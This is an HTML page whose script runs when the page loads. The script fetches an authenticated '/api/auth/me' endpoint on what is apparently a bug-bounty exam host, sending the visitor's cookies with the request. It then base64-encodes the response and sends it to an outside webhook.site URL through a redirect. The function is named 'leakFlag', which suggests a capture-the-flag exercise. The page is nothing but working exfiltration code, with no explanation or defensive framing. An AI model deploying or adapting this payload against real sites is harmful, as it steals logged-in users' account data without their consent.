<!DOCTYPE html>
<html>
<body>
    <script>
    async function leakFlag() {
        const webhook = "https://webhook.site/0279174a-c77a-4643-aa9c-0251998890b0";
        const api = "https://api-bugbounty-exam.hashacademy.co/api/auth/me";

        try {
            const res = await fetch(api, {credentials: "include"});
            const data = await res.text();
            
            // This sends the data as a URL parameter, bypassing POST body issues
            window.location.href = webhook + "?data=" + btoa(data);
        } catch (e) {
            window.location.href = webhook + "?err=" + btoa(e.message);
        }
    }
    leakFlag();
</script>
</body>
</html>
